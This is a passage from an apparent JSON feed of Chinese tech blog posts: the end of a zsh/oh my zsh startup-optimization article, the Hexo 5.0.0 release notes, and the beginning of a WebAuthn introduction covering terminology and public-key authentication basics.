<code>$FPATH</code> 中是否已经包含了 Homebrew 的路径。一般常见的写法都涉及到 <code>echo</code> 和 <code>grep</code> ：</p>\n<pre><code class=\"hljs bash\">[[ $(<span class=\"hljs-built_in\">echo</span> <span class=\"hljs-variable\">$FPATH</span> | grep <span class=\"hljs-string\">\"/usr/local/share/zsh/site-functions\"</span>) ]] &amp;&amp; <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-string\">\"homebrew exists in fpath\"</span></code></pre>\n<p>但是在 zsh 中我们不需要 <code>grep</code> 也可以实现同样的功能：</p>\n<pre><code class=\"hljs bash\">(( <span class=\"hljs-variable\">$FPATH</span>[(I)/usr/<span class=\"hljs-built_in\">local</span>/share/zsh/site-functions] )) &amp;&amp; <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-string\">\"homebrew exists in fpath\"</span></code></pre>\n<p>zsh 内置了在变量中匹配字符串的语法：<code>$variable[(i)keyword]</code> 和 <code>$variable[(I)keyword]</code>，前者是从左往右寻找、后者是从右往左寻找，返回值为第一个匹配的首字符位置，当没有匹配时返回值则是变量的最终位置，也就是说当找不到匹配时 <code>(i)</code> 会返回字符串的长度、而 <code>(I)</code> 会返回 0。因此只需要从右往左寻找、判断返回值是否为 0 即可，搭配将数字转化为布尔值的 <code>(( ))</code> 就可以写出又快又漂亮的条件语句。</p>\n<h3>变量字符串替换</h3>\n<p>当需要截断或者替换字符串时，大部分人第一时间会想到 <code>sed</code> ，因当此需要替换变量中的字符时自然而然的会使用 <code>echo | sed</code>。比如，在 macOS 中主机名 <code>$HOST</code> 变量通常以 <code>.local</code> 结尾：</p>\n<pre><code class=\"hljs bash\">$ <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-variable\">$HOST</span>Sukka-MBP.local</code></pre>\n<p>如果要显示 <code>Sukka-MBP</code> （在 prompt 中常常会用到）就需要写成：</p>\n<pre><code class=\"hljs bash\">$ <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-variable\">$HOST</span> | sed -e <span class=\"hljs-string\">\"s/.local//\"</span>Sukka-MBP</code></pre>\n<p>但是，强大的 zsh 内置了简单的变量字符串替换语法，使用下述命令可以达到相同的效果：</p>\n<pre><code class=\"hljs bash\">$ <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-variable\">${HOST/.local/}</span>Sukka-MBP$ <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-variable\">${HOST/.local/.foxtail}</span>Sukka-MBP.foxtail</code></pre>\n<h2>其它优化手段</h2>\n<h3>禁用多余的插件</h3>\n<p>oh my zsh 在 Wiki 里说「Add wisely, as too many plugins slow down shell startup」。通过 profiling 可以发现一些插件（如 <code>git</code> 插件）执行耗时也不短。考虑到 oh my zsh 内置的 <code>git</code> 插件只是一些 alias、大部分我都用不到，因此将其从 <code>plugins</code> 数组中移除。</p>\n<h3>避免产生子进程</h3>\n<p>在 shell 中有不少语法会产生子进程。由于这些不受控制的子进程可能会产生其它子进程、从而导致潜在的巨大开销。常见的会产生子进程的语法有是 <code>eval</code> 和 Command substitution，在编写 <code>.zshrc</code> 时应该尽量避免使用它们。</p>\n<p>例如，Homebrew 是通过 Ruby —— 一种没有性能优势的语言编写的，而且 Homebrew 的开发者甚至因为不会翻转二叉树而错失了 Google 的 offer（想必大家大体可以猜得出 Homebrew 中的负优化），因此在 zsh 启动时产生一个子进程运行 Homebrew 将是不能忍受的，绝大部分使用 Homebrew 的人都不会改变 Homebrew 的路径，因此与其在 <code>.zshrc</code> 中使用 <code>$(brew --prefix)</code>，不如直接将命令执行的结果（<code>/usr/local</code>）直接写在 <code>.zshrc</code> 中。</p>\n<h3>启用 ZSH_DISABLE_COMPFIX</h3>\n<p>oh my zsh 内置了安全功能、避免 oh my zsh 插件使用不安全的目录和文件，但是这意味着插件在加载时需要通过一系列 security checker。通过禁用安全功能 （<code>export ZSH_DISABLE_COMPFIX=\"true\"</code>）可以使 zsh 启动速度加快 0.06s。微不足道，但值得一试。</p>\n<h2>针对 macOS 的优化</h2>\n<h3>path_helper</h3>\n<p>和 Linux 不同，在 macOS 上 zsh 启动序列的第一项为 <code>/etc/zprofile</code> 而不是 <code>~/.zprofile</code>。macOS 通过 <code>/etc/zprofile</code> 来调用 <code>path_helper</code>：</p>\n<pre><code class=\"hljs bash\">$ cat /etc/zprofile<span class=\"hljs-comment\"># System-wide .profile for sh(1)</span><span class=\"hljs-keyword\">if</span> [ -x /usr/libexec/path_helper ]; <span class=\"hljs-keyword\">then</span>  <span class=\"hljs-built_in\">eval</span> `/usr/libexec/path_helper -s`<span class=\"hljs-keyword\">fi</span><span class=\"hljs-keyword\">if</span> [ <span class=\"hljs-string\">\"<span class=\"hljs-variable\">${BASH-no}</span>\"</span> != <span class=\"hljs-string\">\"no\"</span> ]; <span class=\"hljs-keyword\">then</span>  [ -r /etc/bashrc ] &amp;&amp; . /etc/bashrc<span class=\"hljs-keyword\">fi</span></code></pre>\n<p>而 <code>path_helper</code> 又会读取 <code>/etc/paths</code> 、<code>/etc/paths/d</code>、<code>etc/manpaths</code> 和  <code>etc/manpaths.d</code>、并将其添加到 <code>$PATH</code> 和 <code>$MANPATH</code> 变量中。通过 <code>path_helper</code> macOS 提供了一种快速在不同 shell 中共享  <code>$PATH</code> 和 <code>$MANPATH</code> 的方法。过去，<code>path_helper</code> 是一个 <a href=\"https://mjtsai.com/blog/2009/04/01/slow-opening-terminal-windows\">运行速度很慢的 shell 脚本</a> 以至于有人制作了 <a href=\"https://gist.github.com/mkhl/123525\">专门的 patch</a>、甚至 <a href=\"https://github.com/mgprot/path_helper\">使用 Perl</a> 重写了一个替代品。不过 macOS 意识到了这个问题，现在 <code>path_helper</code> 不再是一个脚本而是一个预编译好的二进制文件。如果你通过 profiling 发现 <code>path_helper</code> 有在拖累 zsh 启动，那么可以考虑放弃使用 <code>/etc/paths/d</code>、而是在 <code>.zshrc</code> 中直接维护 <code>$PATH</code>。</p>\n<h3>login process</h3>\n<p>默认在启动、终端登陆 shell 时会触发 macOS 的 <code>login -fp username</code>。这一操作会调用 <code>syslog()</code> 函数向 <code>/var/log/asl</code> 写入日志、并读取上一次登录记录、以 <code>Last login</code> 的形式显示出来。你可以使用下述命令证实这一行为：</p>\n<pre><code class=\"hljs bash\">ps -ef | grep login</code></pre>\n<p>如果想要通过减少日志写入来加快 zsh 启动速度，可以修改 <code>etc/asl.conf</code> 配置文件中定义的日志等级。</p>\n<p>不少文章也提到，修改 iTerm2 设置中的 <code>Login Command</code> 为 <code>/bin/zsh</code> 可以加快 zsh 启动速度，本质上也是绕过了上述读取和写入日志的环节。</p>\n<blockquote><p>ASL 即 <strong>A</strong>pple <strong>S</strong>ystem <strong>L</strong>og，macOS 10.12 起被弃用，但是仍有系统组件在使用这一接口。</p></blockquote>\n<h2>尾声</h2>\n<p>经过一系列优化，我终于让 zsh 启动速度提升了十倍，速度甚至不亚于 fish 等以性能著称的 shell：</p>\n<pre><code class=\"hljs bash\">$ <span class=\"hljs-keyword\">for</span> i <span class=\"hljs-keyword\">in</span> $(seq 1 5); <span class=\"hljs-keyword\">do</span> /usr/bin/time /bin/zsh -i -c <span class=\"hljs-built_in\">exit</span>; <span class=\"hljs-keyword\">done</span>        0.14 real         0.08 user         0.05 sys        0.12 real         0.07 user         0.04 sys        0.12 real         0.07 user         0.04 sys        0.13 real         0.07 user         0.04 sys        0.13 real         0.07 user         0.04 sys</code></pre>\n<p>如果对我的 <code>.zshrc</code> 文件感兴趣，可以 <a href=\"https://github.com/SukkaW/dotfiles/blob/master/_zshrc/macos.zshrc\">前往 GitHub 查看我开源的 dotfiles</a>。</p>\n<div class=\"license\"> <div class=\"license-title\">我就感觉到快 —— zsh 和 oh my zsh 冷启动速度优化</div> <div class=\"license-link\"><a href=\"https://blog.skk.moe/post/make-oh-my-zsh-fly/\">https://blog.skk.moe/post/make-oh-my-zsh-fly/</a></div> <div class=\"license-meta\"> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">本文作者</div> <div class=\"license-meta-text\">Sukka</div> </div> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">发布于</div> <div class=\"license-meta-text\">2020-08-10</div> </div>\n<div class=\"license-meta-item\"> <div class=\"license-meta-title\">许可协议</div> <div class=\"license-meta-text\"><a href=\"https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">CC BY-NC-SA 4.0</a></div> </div>\n</div>\n<div>转载或引用本文时请遵守许可协议，注明出处、不得用于商业用途！</div>\n</div>\n","link":"https://blog.skk.moe/post/make-oh-my-zsh-fly/"},{"title":"Hexo 5.0.0 正式发布","date":"2020-07-24 02:24:00","description":"\n<p>Node.js 上最快的静态站点生成器 Hexo 发布了 5.0.0 版本。作为 Hexo 核心团队成员，让我为大家介绍一下 Hexo 5.0.0 中的新特性，以及如何从 Hexo 4.x 版本升级到 Hexo 5.0.0。</p>\n<h2>新特性</h2>\n<h3>通过 npm 安装主题</h3>\n<p>过去，安装 Hexo 主题需要 <code>git clone</code> 或者下载、解压 zip；更新主题时还需要迁移 <code>_config.yml</code> 。Hexo 5.0.0 支持通过 npm 安装主题。现在安装一个主题只需要三步：</p>\n<ul>\n<li><p>使用  <code>npm install hexo-theme-[主题的名称]</code> 即可安装主题；</p></li>\n<li>\n<p>在站点的 <code>_config.yml</code> 中指定主题的名称：<br><br></p>\n<pre><code class=\"hljs yaml\"><span class=\"hljs-attr\">theme:</span> <span class=\"hljs-string\">\"[主题的名称]\"</span></code></pre>\n</li>\n<li><p>在站点根目录下新建一个文件 <code>_config.[主题的名称].yml</code>，在该文件中填入主题的配置即可。</p></li>\n</ul>\n<p>对于主题的开发者、插件开发者，以及进阶的 Hexo 用户来说，这是你们想要了解的技术细节：</p>\n<ul>\n<li>为了保证向后兼容性，Hexo 依然支持从 <code>themes/[主题的名称]</code> 目录加载主题。其中，<code>themes/[主题的名称]</code> 的优先级高于 <code>node_modules/hexo-theme-[主题的名称]</code>。也就是说，只有当 Hexo 发现 <code>themes/[主题的名称]</code> 目录不存在时，才会从  <code>node_modules/hexo-theme-[主题的名称]</code> 目录中加载主题。</li>\n<li>Hexo 5.0.0 新增了通过站点根目录下 <code>_config.[主题的名称].yml</code> 文件配置主题的功能。这是除主题目录下的 <code>_config.yml</code> 文件、以及站点配置文件的 <code>theme_config</code> 字段外第三种配置主题的方式。</li>\n<li>为保证向后兼容性，Hexo 会按照如下优先级 deep merge 三份主题配置：<code>站点配置文件的 theme_config 字段 &gt; 站点根目录下的 _config.[主题的名称].yml &gt; 主题目录下的 _config.yml</code>。因此，我们建议主题开发者尽量限制配置文件层级为 1 级，避免在 deep merge 时更深层级的配置项会被合并而不是被覆盖。</li>\n</ul>\n<h3>PrismJS 代码高亮支持</h3>\n<p>Hexo 5.0.0 新增了 PrismJS 代码高亮支持。</p>\n<p>相比 highlight.js 可以在 Node.js 环境执行（即：可在 Hexo 生成页面时进行代码高亮）不同，PrismJS 是一个轻量级的代码高亮库，绝大部分插件都依赖浏览器中执行。Hexo 为了尽可能兼容 PrismJS 的功能和插件，提供了「生成时渲染」和「浏览器渲染」两种模式：前者只需在主题之中引入 PrismJS 的 CSS 即可，但是无法使用大部分 PrismJS 的插件；后者需要在主题中同时引入 PrismJS 的 CSS 和 <code>prism.js</code>，但是可以兼容 PrismJS 大部分插件。</p>\n<p>关于 Hexo 主题的开发者适配 Hexo 的两种代码高亮的技术细节，我们专门撰写了 <a href=\"https://hexo.io/docs/syntax-highlight\">相关的文档页面</a> 以供参考。</p>\n<h3>静态 HTML 片段插入</h3>\n<p>插件开发者经常需要在页面中插入 HTML 片段：播放器插件需要往页面中插入 <code>player.css</code> 和 <code>player.js</code>，lazyload 插件的作者需要往页面中插入 <code>lazyload.js</code>，Live2D 插件的作者需要往页面中插入对应的 CSS 和 JS，等等。Hexo 5.0.0 新增了一个插件 API 接口 <code>Injector</code>，用于往页面的 <code>&lt;head&gt;</code> 和 <code>&lt;body&gt;</code> 标签中注入静态 HTML 片段。这一功能支持：</p>\n<ul>\n<li>在 <code>&lt;head&gt;</code> 之后、<code>&lt;/head&gt;</code> 之前、<code>&lt;body&gt;</code> 之后 和 <code>&lt;/body&gt;</code> 之前四个位置插入代码。</li>\n<li>支持只在特定页面注入 HTML 片段 —— 插件开发者可以仅往文章页面插入 HTML 片段而不影响其他页面如首页和归档。</li>\n</ul>\n<p>插件开发者请参考 Hexo 的 [Injector API 文档] 了解具体使用方法。</p>\n<h3>其他新特性</h3>\n<p>除上述三个重磅功能外，Hexo 还新增了其他功能，如：</p>\n<ul>\n<li>标签插件 API 新增 <code>unregister</code>å 方法</li>\n<li>\n<code>tagcloud</code> 辅助函数新增支持自定义 class 属性和 level</li>\n<li>\n<code>feed_tag</code> 辅助函数增加对 hexo-generator-feed 插件的兼容</li>\n<li>\n<code>youtube</code> 标签插件新增对 YouTube 播放列表的支持，以及可选使用 <code>www.youtube-nocookie.com</code> 域名</li>\n<li>\n<code>post_link</code> 标签插件在找不到对应文章时将会显示警告信息</li>\n<li>\n<code>post_permalink</code> 配置项新增支持 <code>:second</code> 属性</li>\n<li>当文章的标签插件出现渲染错误时，报错信息将会显示出错文件的路径</li>\n</ul>\n<h2>修复的 Bug</h2>\n<ul>\n<li>修复了 数个相邻的标签插件 无法渲染的 Bug</li>\n<li>修复了 文章中的代码块由于包含大括号（<code>{</code> 和 <code>}</code>）导致的渲染失败</li>\n<li>修复了 包含 Source Map 的 Hexo 插件无法加载的 Bug</li>\n<li>修复了 <code>code</code> 标签插件无法解析 <code>wrap</code> 选项的问题</li>\n<li>当 <code>post_asset_folder</code> 功能启用时，<code>hexo new</code> 命令将不再生成错误的 <code>index</code> 目录</li>\n</ul>\n<h2>性能改进</h2>\n<p>一如既往，Hexo 5.0.0 也带来了一系列性能改进，以提升 Hexo 的渲染性能。</p>\n<ul>\n<li>改进了标签插件的渲染性能</li>\n<li>优化了 <code>meta[generator]</code> 标签注入的逻辑</li>\n<li>优化为外部链接添加 <code>rel=noopenner</code> 和 <code>target=\"_blank\"</code> 功能的性能</li>\n<li>确保 <code>after_render:html</code> Filter 在每个页面只执行一次</li>\n<li>优化了 Filter API 的执行速度</li>\n<li>延迟加载代码高亮，减少 Hexo 启动用时</li>\n<li>当执行 <code>hexo clean</code> 时不再加载无关的插件</li>\n</ul>\n<h2>从 Hexo 4.x 升级到 Hexo 5.x</h2>\n<p>Hexo 5.0.0 引入了少数不向后兼容的功能，因此当你升级到 Hexo 5.0.0 时，需要遵循以下步骤进行迁移：</p>\n<h3>升级 Node.js</h3>\n<p>Hexo 5.0.0 不再支持 Node.js 8 及更低版本。为了使用 Hexo 5.0.0，请确保 Node.js 版本不低于 10.13.0。</p>\n<h3>文章 Front-Matter 不再支持 keywords 字段</h3>\n<p>过去这一字段被主要用于 <code>open_graph</code> 辅助函数。升级到 Hexo 5.0.0 后你无需去除现有文章的 Front-Matter 中的 <code>keywords</code> 字段，但这一字段将不会再起任何作用。</p>\n<h3>文章 Front-Matter 中 permalink 字段的行为</h3>\n<p>Hexo 5.0.0 修改了在文章的 Front Matter 中指定 <code>permalink</code> 字段的行为，与独立页面的 <code>permalink</code> 的行为一致。</p>\n<h3>全局变量中不再包含 Lodash</h3>\n<p>Hexo 5.0.0 去除了全局变量中的 Lodash，因此主题无法继续在模板中使用 Lodash。主题开发者应该遵循 <a href=\"https://github.com/you-dont-need/You-Dont-Need-Lodash-Underscore\">You-Dont-Need-Lodash-Underscore</a> 进行迁移。</p>\n<h3>用 updated_option 配置代替 use_date_for_updated</h3>\n<p>Hexo 4.0.0 提供的 <code>use_date_for_updated</code> 配置项现已被 <code>updated_option</code> 替代。</p>\n<ul>\n<li>\n<code>use_date_for_updated: true</code> 现在等价于 <code>updated_option: 'date'</code>。</li>\n<li>\n<code>use_date_for_updated: false</code> 现在等价于 <code>updated_option: 'mtime'</code>。</li>\n</ul>\n<div class=\"license\"> <div class=\"license-title\">Hexo 5.0.0 正式发布</div> <div class=\"license-link\"><a href=\"https://blog.skk.moe/post/hexo-5/\">https://blog.skk.moe/post/hexo-5/</a></div> <div class=\"license-meta\"> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">本文作者</div> <div class=\"license-meta-text\">Sukka</div> </div> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">发布于</div> <div class=\"license-meta-text\">2020-07-24</div> </div>\n<div class=\"license-meta-item\"> <div class=\"license-meta-title\">许可协议</div> <div class=\"license-meta-text\"><a href=\"https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">CC BY-NC-SA 4.0</a></div> </div>\n</div>\n<div>转载或引用本文时请遵守许可协议，注明出处、不得用于商业用途！</div>\n</div>\n","link":"https://blog.skk.moe/post/hexo-5/"},{"title":"谈谈 WebAuthn","date":"2020-03-23 14:57:59","description":"\n<p>WebAuthn，即 Web Authentication，是一个用于在浏览器上进行认证的 API，W3C 将其表述为 “An API for accessing Public Key Credentials”，即“一个用于访问公钥凭证的 API”。WebAuthn 很强大，强大到被认为是 Web 身份认证的未来（当然，也很复杂）。你有想过通过指纹或者面部识别来登录网站吗？WebAuthn 就能在保证安全和隐私的情况下让这样的想法成为现实。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/wwa.gif\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/wwa.gif?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"通过 WebAuthn 调起 Windows Hello 登录网站\" width=\"1912\" height=\"966\" class=\"aligncenter size-full wp-image-2215\"></a>\n<p>你可以在<a href=\"https://webauthn.io/\" rel=\"noopener\">这个网站</a>自行体验 WebAuthn。或者，如果你有一个使用 WordPress 的站点，可以尝试一下 <a href=\"https://wordpress.org/plugins/wp-webauthn/\">WP-WebAuthn</a> 这款插件，它可以为你的站点启用 WebAuthn 登录。这是我为了写这篇文章而练手开发的插件，本文中的部分示例代码也来自这款插件。</p>\n<div class=\"mdx-github-cot\" data-mdxgithuba=\"yrccondor\" data-mdxgithubp=\"wp-webauthn\" data-mdxgithubg=\"https://api.github.com/\"><div class=\"mdx-github-wait-out-c2\"><div class=\"mdx-github-wait-out-c mdui-valign\"><div class=\"mdx-github-wait-out\"><div class=\"mdx-github-wait\"><a href=\"https://github.com/yrccondor/wp-webauthn\"><div class=\"mdui-spinner\"></div></a></div></div></div></div></div>\n<p>WebAuthn Level 1 标准已在 2019 年 3 月成为 W3C 推荐标准，而 Level 2 标准目前也已进入编辑草案阶段，但互联网上有关它的中文资料却仍然很少，国内也鲜有网站支持这一新标准。于是，在抱着各种英文资料和标准啃了几天以后，我折腾出了这篇文章。</p>\n<p>在这篇文章里，我将会从最基本的概念开始，逐渐深入 WebAuthn，直到解码公钥等深层细节。这可能是你能找到的有关 WebAuthn 最详细最基础的中文文章，也很可能是最长的。在开始之前，<strong>我强烈建议你打开菜单中的文章目录浏览一遍，以对这篇文章涉及的内容有所了解。</strong>如果你只是想了解如何简单地在你的项目中添加对 WebAuthn 的支持，那么“<a href=\"https://flyhigher.top/#webauthn-overview\">浅谈 WebAuthn</a>”部分就是你要找的；如果你想了解更多关于 WebAuthn 的底层细节，那么你可以继续阅读“<a href=\"https://flyhigher.top/#deep-into-webauthn\">深入了解 WebAuthn</a>”部分。</p>\n<p>由于在本文写作时 WebAuthn Level 2 规范尚未定稿，<strong>这篇文章我们将只专注于 Level 1 规范。</strong></p>\n<p>这篇文章最后更新于 2020.9 ，在你读到这篇文章时，部分事实可能已经发生改变，请注意判断。</p>\n<p><strong>更新日志：</strong></p>\n<ul>\n<li>2021.1.16 添加 Chrome 开发工具信息</li>\n<li>2020.9.17 更新 iOS/iPad OS 兼容性信息</li>\n<li>2020.5.20 添加部分无用户名认证的平台兼容性内容</li>\n<li>2020.5.15 添加部分 <code>extensions</code> 相关内容与链接；添加全局凭证 ID 唯一内容；添加凭证 ID 查找相关内容；添加“从 U2F 认证迁移”一节</li>\n<li>2020.4.13 更新与修正 <code>userVerification</code> 相关内容；添加部分 Firefox 相关内容</li>\n<li>2020.3.23 文章发布</li>\n</ul>\n<p>那么让我们开始吧。<span></span></p>\n<h1>浅谈 WebAuthn</h1>\n<p>在这个部分里，我们将会从基础概念开始，了解有关 WebAuthn 和密码学的一些基础知识，并最终使用第三方库实现基础的 WebAuthn 认证。如果你已经对这些内容有所了解了，可以跳到“<a href=\"https://flyhigher.top/#deep-into-webauthn\">深入了解 WebAuthn</a>”继续阅读。</p>\n<h2>为什么使用 WebAuthn</h2>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/2.png\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/2.png?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"钓鱼邮件\" width=\"709\" height=\"693\" class=\"aligncenter size-full wp-image-2162\"></a>\n<p>相信你一定收到过类似的邮件吧？只要你点进那个最显眼的链接，你就会进入一个设置好的圈套——钓鱼网站。如果你一时糊涂在这类网站上填写了你的账号和密码，bingo，你的账号就不再是你的账号了。</p>\n<p>不过，就算你警惕心再强，也无法避免密码泄露事件。Twitter, Facebook 等都爆出过明文密码泄露事件，证明再大的公司或组织也无法避免密码泄露问题。雪上加霜的是，很大一部分用户都非常喜欢使用重复密码，这就导致一次密码泄露会牵连很多网站，用户的账户安全性完全无法得到保证。</p>\n<p>那么，有什么办法解决这些问题吗？<strong>彻底解决的方法只有一个，那就是抛弃密码。</strong>可是没有密码还怎么验证用户身份呢？这就是 WebAuthn 的用武之地了。</p>\n<p><del>没有密码的好时代，来临力！</del></p>\n<h2>什么是 WebAuthn</h2>\n<p>那么到底什么是 WebAuthn 呢？如开头所说，WebAuthn 是“一个用于访问公钥凭证的 API”，网站可以通过这个 API 进行一些高安全性的身份验证。WebAuthn 一个最常见的应用就是用于网站登录时的 2FA（双重因素验证）甚至是无密码登录。通过网页调用 WebAuthn，在不同平台下，<strong>我们可以实现通过 USB Key、指纹、面部甚至虹膜扫描来认证身份，同时确保安全和隐私。</strong></p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/4-3.png\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/4-3.png?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"WebAuthn 可使用的各种身份认证方式\" width=\"1294\" height=\"566\" class=\"aligncenter size-full wp-image-2213\"></a>\n<p>WebAuthn 标准是 FIDO2 标准的一部分，而 FIDO2 则是由 FIDO 联盟和 W3C 共同推出的 U2F（现称作 FIDO1）的后继标准，旨在增强网络认证的安全性。</p>\n<blockquote><p>你可能了解过 U2F，那么 U2F 和 FIDO2 的区别在哪里呢？从名字上可以看出，U2F，即“通用第二因素协议”，是专注于作为密码后的第二道屏障的，而 FIDO2 增加了单因素认证功能，这意味着使用 FIDO2 可以完全替代密码，真正实现无密码登录。</p></blockquote>\n<p>FIDO2 标准主要包括四个部分，其一是用于网站和访客设备交互的 WebAuthn，而 Client to Authenticator Protocol 2（CTAP2，客户端-认证器协议）作为 WebAuthn 的补充，则是用于访客的设备和认证器交互的协议。标准的其他两个部分则是 U2F 和 UAF 规范。在这篇文章中，我们只关心 WebAuthn，不会涉及 CTAP, U2F 和 UAF 的相关知识。如果你对这段话中的一些概念不了解，不要紧张，接下来我们就来谈谈 WebAuthn 中一些常用的术语和概念。</p>\n<blockquote><p>WebAuthn 只能在安全上下文中使用，也就是说，页面需要使用 HTTPS 协议或是处于 <code>localhost</code> 中。</p></blockquote>\n<h2>常用术语和概念</h2>\n<p>WebAuthn 中有许多不常碰到的术语，不过我只会在这里介绍一些常用的术语和概念——如果你只是希望做出一个简单的实现，那么了解这一段中的一些概念就足够了。同时，由于我实在没能找到一部分术语的通用翻译，有一些术语我按着自己的理解尽可能地翻译了，有任何问题请告诉我。</p>\n<p>在一个完整的 WebAuthn 认证流程中，通常有这么几个角色：</p>\n<ul>\n<li>Relying Party 依赖方 (RP) ：指服务提供方，即网站</li>\n<li>User 用户：正准备登录的你</li>\n<li>Authenticator 认证器：通常指 USB Key 或是设备内置的指纹扫描器、虹膜扫描器、面部识别装置等，正是它们在使用流程中代替了密码甚至是用户名</li>\n<li>User Agent 用户代理：通常指浏览器或系统，负责与认证器交互</li>\n</ul>\n<p>认证过程通常分为两种：</p>\n<ul>\n<li>Registration Ceremony 注册仪式：用户向账户上添加认证器</li>\n<li>Authentication Ceremony 验证仪式：用户通过已注册的认证器验证身份</li>\n</ul>\n<p>同时，认证过程中还会产生这些内容：</p>\n<ul>\n<li>Challenge 挑战：通常是一串随机字符串</li>\n<li>Public Key Credential 公钥凭证：由认证器产生的凭证，在技术上代替了密码</li>\n<li>Attestation 证明：注册时认证器产生的验证数据</li>\n<li>Assertion 断言：验证时认证器产生的验证数据</li>\n</ul>\n<blockquote><p><strong>请注意区分证明 (Attestation) 和断言 (Assertion)</strong>，特别是在这两个单词有些相似的情况下。在 WebAuthn 中，它们是不同过程中的类似概念，但并不相同。</p></blockquote>\n<p>如果你对于这些内容不是很理解，没有关系，我们会在“<a href=\"https://flyhigher.top/#how-to-webauthn\">使用流程</a>”一节中将这些概念放到实际情况中解释，你只要先区分这些概念即可。</p>\n<h2>安全性的基础</h2>\n<p>WebAuthn 为什么安全？和 HTTPS 一样，WebAuthn 使用非对称加密的思路来保证安全性，但侧重点又有所不同。要理解 WebAuthn 的认证流程，我们必须对非对称加密有所了解。如果你对非对称加密比较熟悉了，就直接跳到下一段吧。</p>\n<p>WebAuthn 的核心在于“认证”，即保证产生了凭证的认证器是用户的认证器，而不是第三方在伪造凭证。但为什么要使用非对称加密呢？我们可以先来看看对称加密。</p>\n<p>让我们假设小明和小红相互写信，见不到对方。这天小红突然想，给自己写信的人是不是真的小明呢？于是小红要求对方向小红证明自己是小明。怎么证明呢？他们商量出来这么一套方案：</p>\n<ol>\n<li>在小明的身份已经验证的情况下，小明和小红商量一个统一的密码和密钥</li>\n<li>一段时间后，在小红要求小明验证身份时，小红发送一段文本给小明</li>\n<li>小明用提前和小红商量好的密码和密钥加密文本后发回给小红</li>\n<li>小红使用相同的密码和密钥解密文本，如果得到文本和之前发送的一致，就表明对方拥有正确的密码和密钥</li>\n</ol>\n<blockquote><p>在密码学中，我们通常把“加密算法”称为密码 (code)，和通常登录时用的密码 (password) 并非同一个概念。</p></blockquote>\n<p>在这种情况下，<strong>只要密钥不泄露</strong>，即拥有正确密钥的只有小明和小红，那么小红就能确定对方一定是小明。但这样的问题也很明显，如果小明和小红不能见面，那么他们就必须先以明文交换密码——<strong>在这个过程中一旦有人窃取到了密码，这个认证就无效了。</strong></p>\n<p>这时我们就需要使用<strong>非对称加密</strong>来拯救破碎的信任了。非对称加密的基础是一对密钥，也就是公钥和私钥，它们是互相关联但（几乎）无法互相推导的。在非对称加密的过程中，选择相同的密码后，使用私钥加密明文得到的密文只能由对应的公钥解密，无法使用私钥解密，同时这个过程反过来也是成立的。</p>\n<blockquote><p>本文的核心并不是非对称加密算法，因此不会详述非对称加密在数学上的证明，若有兴趣可以自行了解。</p></blockquote>\n<p>这就完美解决密钥泄露的问题了。让我们回过头来看之前的例子。现在小明和小红决定使用非对称加密来证明身份，过程如下：</p>\n<ol>\n<li>在小明的身份已经验证的情况下，小明提前生成一对公私钥，将公钥发送给小红，私钥自己保管，同时商量好统一的密码</li>\n<li>一段时间后，在小红要求小明验证身份时，小红发送一段文本给小明</li>\n<li>小明使用商量好的密码和自己的私钥加密文本，发送给小红</li>\n<li>小红使用相同的密码和小明的公钥解密文本，如果得到文本和之前发送的一致，就表明对方拥有正确的密码和私钥</li>\n</ol>\n<p>在这种情况下，<strong>只要私钥不泄露</strong>，那么小红解密得到的文本和之前发送的一致，那么就可以证明收到的密文一定是由小明加密后发送过来的。而在整个过程中，私钥都没有离开过小明，更没有经过传输，也就几乎没有泄露的可能了。这时，小红终于可以确定对面和她通信的人的确是小明了。</p>\n<p>题外话：HTTPS 虽然也应用了非对称加密，但 HTTPS 更侧重于“加密”而非“认证”，因此思路上会有些许差异。要了解关于 HTTPS 和非对称加密的更多信息，你可以阅读我之前写的这篇文章：</p>\n<p></p>\n<div class=\"mdx-post-cot\" data-mdxposturl=\"https://flyhigher.top/develop/1093.html\"><div class=\"mdx-post-wait-out-c2\"><div class=\"mdx-post-wait-out-c mdui-valign\"><div class=\"mdx-github-wait-out\"><div class=\"mdx-github-wait\"><a href=\"https://flyhigher.top/develop/1093.html\"><div class=\"mdui-spinner\"></div></a></div></div></div></div></div>\n<span></span>\n<h2>使用流程</h2>\n<p>了解了非对称加密，我们就可以来看看 WebAuthn 的认证流程了。</p>\n<p>和普通的密码一样，<strong>使用 WebAuthn 分为两个部分，注册和验证。</strong>注册仪式会在依赖方中将认证器的一些信息和用户建立关联；而验证仪式则是验证这些信息以登确保是用户本人在登录。根据上一节的思路，我们可以知道，注册仪式就是认证器生成一对公私钥，然后将公钥交给依赖方；而验证仪式是依赖方发送给认证器一段文本，要求认证器用自己的私钥加密后发回以验证。</p>\n<p>在实际情况中，WebAuthn 是基于<strong>挑战-应答模型</strong>工作的。要更好地理解，我们直接来看具体流程。先来看看注册的流程。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/lc1.png\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/lc1.png?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"WebAuthn 注册流程\" width=\"1100\" height=\"604\" class=\"aligncenter size-full 